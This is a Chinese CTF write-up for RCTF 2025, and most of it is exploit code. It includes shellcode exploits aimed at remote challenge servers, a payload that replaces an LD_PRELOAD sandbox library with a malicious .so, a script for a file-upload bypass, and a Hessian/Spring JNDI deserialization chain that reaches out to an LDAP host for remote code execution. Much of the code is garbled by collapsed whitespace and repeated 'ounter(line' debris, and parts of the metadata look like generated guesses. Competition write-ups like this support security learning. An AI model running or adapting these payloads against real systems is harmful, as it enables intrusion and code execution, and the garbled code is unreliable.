---
title: RCTF 2025 WP - XMCVE-Polaris 战队第 16 名
contest: RCTF 2025
year: 2025
difficulty: hard
vuln_type: deserialize
tags:
- pwn
- sandbox-bypass
- ld-preload
- ldap-jndi
- spring-jndi
- hessian
- csrf-upload
- race-condition
- jvm-sandbox
- ld.so
attack_chain:
- RCTF 2025 XMCVE-Polaris 战队第 16 名 5010.05 分
- 'pwn: bookkeeping 算 double NaN/special 触发浮点漏洞'
- struct.pack('<Q', 0x0D0E0A0D0B0E0E0F) 转 double = 8.592564544313935e-246
- runcode() 写 0x20 shellcode 含 syscall (mov rcx, rsi; mov dl, 0xff; syscall)
- 'orw shellcode: sub rbp/rsp 0x12345678 + push 0x67616c66 "flag" + open+read+write'
- 'sandbox 题: LD_PRELOAD=sandbox.so 加载恶意 .so'
- 写恶意 base64 so 到 /opt/maxkb-app/sandbox/sandbox.so
- base64 编码后 Python exec() payload 写文件
- 'Spring Hessian 反序列化: Maybe(InvocationHandler) + ObjectFactory<T> + JNDI'
- ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory 用 Unsafe 反射设 beanFactory=SimpleJndiBeanFactory
- targetBeanName="ldap://attacker" → JNDI 注入 → RCE
- 'Web 题: CSRF 漏洞 /api/photos/upload 接受 files = [(''photos[]'', (''x.png'', f, ''-1''))] content-type -1'
- set_background photo_id → superadmin.php 触发
- '完整 POC: register → upload_photo → set_background → get_flag'
key_payload: bookkeeping() + runcode(shellcode) + sandbox.so LD_PRELOAD bypass + Spring JNDI ldap://attacker
one_liner: RCTF 2025 XMCVE-Polaris 战队第 16 名 3 大方向：PWN (浮点漏洞 + syscall) + Sandbox (LD_PRELOAD 替换 sandbox.so) + Web (Spring Hessian 反序列化 + CSRF 上传)。
lesson: 浮点特殊值可触发 double 转 long 时漏洞；LD_PRELOAD 是 sandbox 攻击最经典入口 (替换 .so)；Hessian 反序列化 + JNDI + Spring ObjectFactory 链可绕过白名单 (com.rctf.server.tool./java.util./org.springframework.beans./org.springframework.jndi.)。
quality: high
full_path: RCTF2025-WP.full.md
meta_path: RCTF2025-WP.meta.md
images_removed: true
images_removed_count: 12
schema_version: v3.0.0-P0
summary: RCTF 2025 WP - XMCVE-Polaris 战队第 16 名。RCTF 2025 XMCVE-Polaris 战队第 16 名 3 大方向：PWN (浮点漏洞 + syscall) + Sandbox (LD_PRELOAD 替换 sandbox.so) + Web (Spring Hessian 反序列化 + CSRF 上传)。。关键路径：RCTF 2025 XMCVE-Po...
category: web
subcategory: deserialization
tools_used:
- Python
- Spring
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 12
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/284214.html
reasoning_chain:
- 战队排名 16 总结 WP → 触发点：3 大方向 PWN/Sandbox/Web
- PWN bookkeeping 浮点漏洞：struct.pack('<Q', 0x0D0E0A0D0B0E0E0F) 转 double = 8.59e-246 → 触发 NaN/special
- runcode() 写 0x20 shellcode 含 syscall → 假设：sub rbp/rsp 0x12345678 + push flag + open+read+write
- Sandbox 题：LD_PRELOAD=sandbox.so 加载 → 假设：可替换 sandbox.so → 动作：写 base64 .so 到 /opt/maxkb-app/sandbox/sandbox.so
- Spring Hessian：Maybe(InvocationHandler)+ObjectFactory<T>+JNDI → ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory 反射设 beanFactory
- 反射链：Unsafe.putObject 设 beanFactory=SimpleJndiBeanFactory + targetBeanName=ldap://attacker → 触发 JNDI → RCE
- Web：CSRF /api/photos/upload content-type=-1 绕过 → set_background photo_id → superadmin.php 拿 flag
failed_attempts:
- 试图直接 syscall write 拿 flag → 失败：sandbox 拦截
- 试图用普通 Runtime.exec → 失败：Hessian 黑名单
- 试图用 type='image/png' → 失败：-1 才是 bypass 关键
key_observations:
- 浮点 NaN/special 值可触发 double 转 long 时漏洞
- LD_PRELOAD 替换 sandbox.so 是 sandbox 攻击最经典入口
- Spring Hessian 黑名单可用 ObjectFactory 链绕过
- file upload content-type=-1 是 Apache CGI 路径处理技巧
prerequisites:
- Java 反序列化 (Hessian/Jackson/CVE 链)
- Spring BeanFactory 反射机制
- LD_PRELOAD 与 .so 动态加载
- Apache mod_extfilter + content-type 处理
---
# RCTF2025-WP

> 原文: https://www.ctfiot.com/284214.html
> ID: 284214

本次 RCTF2025，我们 XMCVE-Polaris 战队排名第 16 。

排名

队伍

总分

11

N0wayBack

6367.56

12

JNSEC

6157.14

13

Ph0t1n1a

5475.99

14

W&M

5064.03

15

_0xFFF_

5052

16

XMCVE-Polaris

5010.05

17

Nepnep

4589

18

有点调皮

4582.09

19

V&N

4556

20

だから僕はCTFを辞めた

4467.45

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linefrompwnimport*fromstructimport*#p = process('./pwn')p = remote('101.245.98.115',26100)context(arch='amd64',log_level='debug',os='linux')p.recvuntil("3.exitn")p.sendline("2")p.recvuntil("input:n")packed_bytes = struct.pack('<Q',0x0D0E0A0D0B0E0E0F)the_double = struct.unpack('<d', packed_bytes)[0]p.sendline(str(the_double))p.sendlineafter('Make a choice:',"1")p.recvuntil("your code:")shellcode ="""pop rdxpop rdxpop rdxpop rsipop rsipop rsisyscall"""shellcode = asm(shellcode)p.send(shellcode)shellcode = asm("""push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall""")payload =b'a'*0x32 + shellcodep.send(payload)p.interactive()

ounter(lineounter(lineounter(lineounter(lineounter(lineaddrsp,0x12345678addrbp,0x12345678// shellcodesub rsp,0x12345678sub rbp,0x12345678

ounter(lineounter(lineounter(lineounter(linesyscall //0f05movrsi, rcx //4889cemovdl,0xff //b2 ffsyscall //0f05

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linesubrbp,0x12345678subrsp,0x12345678push0x67616c66movrdi,rspxorrsi,rsimovrax,2syscallmovrdi,raxmovrsi,rspmovrdx,0x50xorrax,raxsyscallmovrdi,1movrsi,rspmovrdx,0x50movrax,1syscall

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line#!/usr/bin/env python3
# -*- coding: utf-8 -*-#@file: exp.py#@author: fuchen#@contact: MTM3MjIwMzYwQHFxLmNvbQ==#@created: 2025-11-15#@description: Pwn exploit template for CTF challenges
from pwn import *context(arch='amd64', os='linux', log_level='debug')LOCAL=TrueBINARY="./chal"LIBC="./libc.so.6"HOST="1.95.164.64"PORT=26000defsetup(): ifLOCAL: returnprocess(BINARY) else: returnremote(HOST,PORT)s =lambdadata :p.send(data)sa =lambdadelim,data :p.sendafter(delim, data)sl =lambdadata :p.sendline(data)sla =lambdadelim,data :p.sendlineafter(delim, data)r =lambdanum=4096 :p.recv(num)ru =lambdadelims, drop=False:p.recvuntil(delims, drop)rl =lambda :p.recvline()itr =lambda :p.interactive()uu32 =lambdadata :
u32(data.ljust(4, b' '))uu64 =lambdadata :
u64(data.ljust(8, b' '))uu16 =lambdadata :
u16(data.ljust(2, b' '))uu8 =lambdadata :u8(data)leak =lambdaname,addr :
log.success(f"{name} = {hex(addr)}")dbg =lambdacmd='' :
gdb.attach(p, cmd)defnotes(): sla(b"3.exitn",b"1")defadd(size): sla(b"5.backn",b"1") sla(b"size:",str(size).encode())defdelete(): sla(b"5.backn",b"2")defsave(filename): sla(b"5.backn",b"3") sl(b"filename: ",filename)defedit(): sla(b"5.backn",b"4")defback(): sla(b"5.backn",b"4")defbookkeeping(): sla(b"3.exitn",b"2") sla(b"input:n",str(8.592564544313935e-246).encode())defruncode(content): sla(b"Make a choice:",b"1") sa(b"your code:",content)defgetcanary(): sla(b"Make a choice:",b"2")defexploit(): global p p = setup() elf =ELF(BINARY) libc =ELF(LIBC)ifLIBCelseNone #dbg('b *$rebase(0x1a79)') #pause() bookkeeping() payload = b"x0fx05x48x89xcexb2xffx0fx05" runcode(payload) orw =''' sub rbp,0x12345678 sub rsp,0x12345678 push 0x67616c66 mov rdi,rsp xor rsi,rsi mov rax,2 syscall mov rdi,rax mov rsi,rsp mov rdx,0x50 xor rax,rax syscall mov rdi,1 mov rsi,rsp mov rdx,0x50 mov rax,1 syscall ''' shellcode = b"x48x89xcexb2xffx0fx05"+ asm(orw) sleep(1) sl(shellcode) #pause() itr()if__name__ =="__main__": try: exploit() exceptExceptionase: log.error(f"Exploit failed: {e}") if'p'inglobals(): p.close() raise

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line@@ -188,6+194,9@@ exec({dedent(code)!a}) self.user, ], 'cwd':
self.sandbox_path,+ 'env': {+ 'LD_PRELOAD':f'{self.sandbox_path}/sandbox.so',+ }, 'transport':'stdio', } else:@@ -204,6+213,9@@ exec({dedent(code)!a}) file.write(_code) os.system(f"chown{self.user}:
root{exec_python_file}") kwargs = {'cwd': BASE_DIR}+ kwargs['env'] = {+ 'LD_PRELOAD':f'{self.sandbox_path}/sandbox.so',+ } subprocess_result = subprocess.run( ['su','-s', python_directory,'-c',"exec(open('"+ exec_python_file +"').read())",self.user], text=True,

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linedefpayload(): importbase64 importos malicious_so_b64="xxxx" malicious_data = base64.b64decode(malicious_so_b64) withopen("/opt/maxkb-app/sandbox/sandbox.so","wb")asf: f.write(malicious_data) return"sandbox.so replaced successfully"

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# path: exploit.pyimportsys, re, uuid, base64, io, requestsdefget(url, s): r = s.get(url, allow_redirects=True) r.raise_for_status() returnr.textdefpost(url, s, data=None, files=None): r = s.post(url, data=data, files=files) r.raise_for_status() returnrdefb64png(): returnbase64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==')defextract_csrf_from_register(html): m = re.search(r'name="csrf_token"s+value="([^"]+)"', html) returnm.group(1)defextract_csrf_from_settings(html): m = re.search(r"const csrfToken = '([^']+)'", html) returnm.group(1)defregister(base, s): html = get(base +'/register', s) token = extract_csrf_from_register(html) email =f'{uuid.uuid4().hex[:8]}@example.com' data = { 'username':'user'+ uuid.uuid4().hex[:6], 'email': email, 'password':'Passw0rd!', 'confirm_password':'Passw0rd!', 'csrf_token': token } r = post(base +'/api/register', s, data=data) j = r.json() ifnotj.get('success'): raiseRuntimeError('register failed: '+str(j)) returnemaildefupload_photo(base, s): png = b64png() f = io.BytesIO(png) files = [('photos[]', ('x.png', f,'-1'))] r = post(base +'/api/photos/upload', s, files=files) j = r.json() ifnotj.get('success')ornotj.get('photos'): raiseRuntimeError('upload failed: '+str(j)) returnj['photos'][0]['id']defset_background(base, s, photo_id): html = get(base +'/settings', s) token = extract_csrf_from_settings(html) data = {'photo_id': photo_id,'csrf_token': token} r = post(base +'/api/user/background', s, data=data) j = r.json() ifnotj.get('success'): raiseRuntimeError('set background failed: '+str(j))defget_flag(base, s): r = s.get(base +'/superadmin.php') ifr.status_code ==200: returnr.text.strip() raiseRuntimeError('flag fetch failed, status: '+str(r.status_code))defmain(): base = sys.argv[1]iflen(sys.argv) >1else'http://1.95.160.41:
26000/' s = requests.Session() register(base, s) pid = upload_photo(base, s) set_background(base, s, pid) flag = get_flag(base, s) print(flag)if__name__ =='__main__': main()

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//packagecom.rctf.server.controller;importcom.rctf.server.tool.HessianFactory;importorg.springframework.stereotype.Controller;importorg.springframework.web.bind.annotation.RequestMapping;importorg.springframework.web.bind.annotation.RequestParam;@ControllerpublicclassRCTFController{ @RequestMapping({"/hello"}) publicString hello(@RequestParam(name ="data",required = false)Stringdata) throws Exception { Object obj = HessianFactory.deserialize(data); return"hello"; }}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line static{ WHITE_PACKAGES.add("com.rctf.server.tool."); WHITE_PACKAGES.add("java.util."); WHITE_PACKAGES.add("org.apache.commons.logging."); WHITE_PACKAGES.add("org.springframework.beans."); WHITE_PACKAGES.add("org.springframework.jndi."); }

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.rctf.server.tool;importjava.io.Serializable;importjava.lang.reflect.InvocationHandler;importjava.lang.reflect.Method;importjava.lang.reflect.Proxy;publicclassMaybeextendsProxyimplementsComparable<Object>,Serializable{ publicMaybe(InvocationHandlerh) { super(h); } publicintcompareTo(Objecto) { try{ Methodmethod =Comparable.class.getMethod("compareTo",Object.class); Objectresult =this.h.invoke(this, method,newObject[]{o}); return(Integer)result; }catch(Throwablee) { thrownewRuntimeException(e); } }}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line/***@nameEmpty block*@kindproblem*@problem.severity warning*@idjava/example/empty-block*/importjavaimportlibs.Sourceimportlibs.DangerousMethodsclassInvokerHandlerextendsClass{ InvokerHandler() { this.getASupertype*().getQualifiedName() ="java.lang.reflect.InvocationHandler"and ( this.getQualifiedName().regexpMatch("java.util.+") or this.getQualifiedName().regexpMatch("org.apache.commons.logging.+") or this.getQualifiedName().regexpMatch("org.springframework.beans.+") or this.getQualifiedName().regexpMatch("org.springframework.jndi.+") ) }}classHessianObjectFactoryextendsMethod{ HessianObjectFactory() { // this.getASupertype*().getQualifiedName() = "org.springframework.beans.factory.ObjectFactory" this.getName() ="getObject"and this.hasNoParameters() and ( this.getQualifiedName().regexpMatch("java.util.+") or this.getQualifiedName().regexpMatch("org.apache.commons.logging.+") or this.getQualifiedName().regexpMatch("org.springframework.beans.+") or this.getQualifiedName().regexpMatch("org.springframework.jndi.+") ) }}// from HessianObjectFactory i, DangerousMethod m// where i.calls(m)// select ifrom DangerousMethod mselect m, m.getName()

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line privatestaticclassObjectFactoryDelegatingInvocationHandlerimplementsInvocationHandler,Serializable{ privatefinal ObjectFactory<?> objectFactory; ObjectFactoryDelegatingInvocationHandler(ObjectFactory<?> objectFactory) { this.objectFactory = objectFactory; } publicObjectinvoke(Object proxy, Method method, Object[]args) throws Throwable{ switch(method.getName()) { case"equals": returnproxy ==args[0]; case"hashCode": returnSystem.identityHashCode(proxy); case"toString": returnthis.objectFactory.toString(); default: try{ returnmethod.invoke(this.objectFactory.getObject(),args); }catch(InvocationTargetException ex) { throwex.getTargetException(); } } } }

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//packageorg.springframework.beans.factory;importorg.springframework.beans.BeansException;@FunctionalInterfacepublicinterfaceObjectFactory<T> { TgetObject()throwsBeansException;}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//packageorg.springframework.beans.factory.config;importjava.io.Serializable;importorg.springframework.beans.BeansException;importorg.springframework.beans.factory.BeanFactory;importorg.springframework.beans.factory.ObjectFactory;importorg.springframework.lang.Nullable;importorg.springframework.util.Assert;publicclassObjectFactoryCreatingFactoryBeanextendsAbstractFactoryBean<ObjectFactory<Object>> { @Nullable privateString targetBeanName; publicvoid setTargetBeanName(String targetBeanName) { this.targetBeanName = targetBeanName; } publicvoid afterPropertiesSet() throws Exception { Assert.hasText(this.targetBeanName,"Property 'targetBeanName' is required"); super.afterPropertiesSet(); } publicClass<?> getObjectType() { returnObjectFactory.class; } protectedObjectFactory<Object> createInstance() { BeanFactory beanFactory =this.getBeanFactory(); Assert.state(beanFactory !=null,"No BeanFactory available"); Assert.state(this.targetBeanName !=null,"No target bean name specified"); returnnew TargetBeanObjectFactory(beanFactory,this.targetBeanName); } privatestaticclassTargetBeanObjectFactoryimplementsObjectFactory<Object>,Serializable{ privatefinalBeanFactory beanFactory; privatefinalString targetBeanName; publicTargetBeanObjectFactory(BeanFactory beanFactory, String targetBeanName) { this.beanFactory = beanFactory; this.targetBeanName = targetBeanName; } publicObject getObject() throws BeansException { returnthis.beanFactory.getBean(this.targetBeanName); } }}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//packageorg.springframework.jndi.support;importjava.util.Collections;importjava.util.HashMap;importjava.util.HashSet;importjava.util.Map;importjava.util.Set;importjavax.naming.NameNotFoundException;importjavax.naming.NamingException;importorg.springframework.beans.BeansException;importorg.springframework.beans.factory.BeanDefinitionStoreException;importorg.springframework.beans.factory.BeanFactory;importorg.springframework.beans.factory.BeanNotOfRequiredTypeException;importorg.springframework.beans.factory.NoSuchBeanDefinitionException;importorg.springframework.beans.factory.NoUniqueBeanDefinitionException;importorg.springframework.beans.factory.ObjectProvider;importorg.springframework.core.ResolvableType;importorg.springframework.jndi.JndiLocatorSupport;importorg.springframework.jndi.TypeMismatchNamingException;importorg.springframework.lang.Nullable;publicclassSimpleJndiBeanFactoryextendsJndiLocatorSupportimplementsBeanFactory{ privatefinalSet<String> shareableResources = new HashSet(); privatefinalMap<String, Object> singletonObjects = new HashMap(); privatefinalMap<String, Class<?>> resourceTypes = new HashMap(); publicSimpleJndiBeanFactory() { this.setResourceRef(true); } publicvoid addShareableResource(String shareableResource) { this.shareableResources.add(shareableResource); } publicvoid setShareableResources(String... shareableResources) { Collections.addAll(this.shareableResources, shareableResources); } publicObject getBean(String name) throws BeansException { returnthis.getBean(name, Object.class); } public<T> T getBean(String name, Class<T> requiredType) throws BeansException { try{ return(T)(this.isSingleton(name) ?this.doGetSingleton(name, requiredType) :
this.lookup(name, requiredType)); }catch(NameNotFoundException var4) { thrownew NoSuchBeanDefinitionException(name,"not found in JNDI environment"); }catch(TypeMismatchNamingException ex) { thrownew BeanNotOfRequiredTypeException(name, ex.getRequiredType(), ex.getActualType()); }catch(NamingException ex) { thrownew BeanDefinitionStoreException("JNDI environment", name,"JNDI lookup failed", ex); } } publicObject getBean(String name,@NullableObject... args) throws BeansException { if(args !=null) { thrownew UnsupportedOperationException("SimpleJndiBeanFactory does not support explicit bean creation arguments"); }else{ returnthis.getBean(name); } } public<T> T getBean(Class<T> requiredType) throws BeansException { return(T)this.getBean(requiredType.getSimpleName(), requiredType); } public<T> T getBean(Class<T> requiredType,@NullableObject... args) throws BeansException { if(args !=null) { thrownew UnsupportedOperationException("SimpleJndiBeanFactory does not support explicit bean creation arguments"); }else{ return(T)this.getBean(requiredType); } } public<T> ObjectProvider<T> getBeanProvider(finalClass<T> requiredType) { returnnew ObjectProvider<T>() { publicT getObject() throws BeansException { return(T)SimpleJndiBeanFactory.this.getBean(requiredType); } publicT getObject(Object... args) throws BeansException { return(T)SimpleJndiBeanFactory.this.getBean(requiredType, args); } @Nullable publicT getIfAvailable() throws BeansException { try{ return(T)SimpleJndiBeanFactory.this.getBean(requiredType); }catch(NoUniqueBeanDefinitionException ex) { throwex; }catch(NoSuchBeanDefinitionException var3) { returnnull; } } @Nullable publicT getIfUnique() throws BeansException { try{ return(T)SimpleJndiBeanFactory.this.getBean(requiredType); }catch(NoSuchBeanDefinitionException var2) { returnnull; } } }; } public<T> ObjectProvider<T> getBeanProvider(ResolvableType requiredType) { thrownew UnsupportedOperationException("SimpleJndiBeanFactory does not support resolution by ResolvableType"); } publicboolean containsBean(String name) { if(!this.singletonObjects.containsKey(name) && !this.resourceTypes.containsKey(name)) { try{ this.doGetType(name); returntrue; }catch(NamingException var3) { returnfalse; } }else{ returntrue; } } publicboolean isSingleton(String name) throws NoSuchBeanDefinitionException { returnthis.shareableResources.contains(name); } publicboolean isPrototype(String name) throws NoSuchBeanDefinitionException { return!this.shareableResources.contains(name); } publicboolean isTypeMatch(String name, ResolvableType typeToMatch) throws NoSuchBeanDefinitionException { Class<?> type =this.getType(name); returntype !=null&& typeToMatch.isAssignableFrom(type); } publicboolean isTypeMatch(String name,@NullableClass<?> typeToMatch) throws NoSuchBeanDefinitionException { Class<?> type =this.getType(name); returntypeToMatch ==null|| type !=null&& typeToMatch.isAssignableFrom(type); } @Nullable publicClass<?> getType(String name) throws NoSuchBeanDefinitionException { returnthis.getType(name,true); } @Nullable publicClass<?> getType(String name, boolean allowFactoryBeanInit) throws NoSuchBeanDefinitionException { try{ returnthis.doGetType(name); }catch(NameNotFoundException var4) { thrownew NoSuchBeanDefinitionException(name,"not found in JNDI environment"); }catch(NamingException var5) { returnnull; } } publicString[] getAliases(String name) { returnnew String[0]; } private<T> T doGetSingleton(String name,@NullableClass<T> requiredType) throws NamingException { synchronized(this.singletonObjects) { Object singleton =this.singletonObjects.get(name); if(singleton !=null) { if(requiredType !=null&& !requiredType.isInstance(singleton)) { thrownew TypeMismatchNamingException(this.convertJndiName(name), requiredType, singleton.getClass()); }else{ return(T)singleton; } }else{ T jndiObject = (T)this.lookup(name, requiredType); this.singletonObjects.put(name, jndiObject); returnjndiObject; } } } privateClass<?> doGetType(String name) throws NamingException { if(this.isSingleton(name)) { returnthis.doGetSingleton(name, (Class)null).getClass(); }else{ synchronized(this.resourceTypes) { Class<?> type = (Class)this.resourceTypes.get(name); if(type ==null) { type =this.lookup(name, (Class)null).getClass(); this.resourceTypes.put(name, type); } returntype; } } }}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepackageorg.example;importcom.rctf.server.tool.Maybe;importorg.springframework.jndi.support.SimpleJndiBeanFactory;importsun.misc.Unsafe;importysomap.core.util.ReflectionHelper;importjava.lang.reflect.Constructor;importjava.lang.reflect.Field;importjava.lang.reflect.InvocationHandler;importjava.lang.reflect.Proxy;importjava.security.SignedObject;importjava.util.HashMap;importjava.util.Map;importjava.util.TreeMap;importjava.util.TreeSet;publicclassExp{ publicstaticvoidmain(String[] args)throws Exception{ FieldtheUnsafe=Unsafe.class.getDeclaredField("theUnsafe"); theUnsafe.setAccessible(true); Unsafeunsafe=(Unsafe) theUnsafe.get(null); Class<?> name = Class.forName("org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory"); Objecto1=unsafe.allocateInstance(name); SimpleJndiBeanFactorysimpleJndiBeanFactory=newSimpleJndiBeanFactory(); unsafe.getAndSetObject(o1,unsafe.objectFieldOffset(name.getDeclaredField("beanFactory")),simpleJndiBeanFactory); unsafe.getAndSetObject(o1,unsafe.objectFieldOffset(name.getDeclaredField("targetBeanName")),"ldap://112.124.59.213:
50389/a1ab9c"); InvocationHandlero=(InvocationHandler) unsafe.allocateInstance(Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")); longobjectFactory=unsafe.objectFieldOffset(Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").getDeclaredField("objectFactory")); unsafe.getAndSetObject(o,objectFactory,o1); Maybemaybe=newMaybe(o); TreeSettreeSet=makeTreeSet(maybe, maybe); Stringserialize=HessianFactory.serialize(treeSet); System.out.println(serialize);// HessianFactory.deserialize(serialize); } publicstaticTreeSetmakeTreeSet(Object v1, Object v2)throwsException { TreeMap<Object,Object> m =newTreeMap<>(); ReflectionHelper.setFieldValue(m,"size",2); ReflectionHelper.setFieldValue(m,"modCount",2); Class<?> nodeC = Class.forName("java.util.TreeMap$Entry"); ConstructornodeCons=nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC); ReflectionHelper.setAccessible(nodeCons); 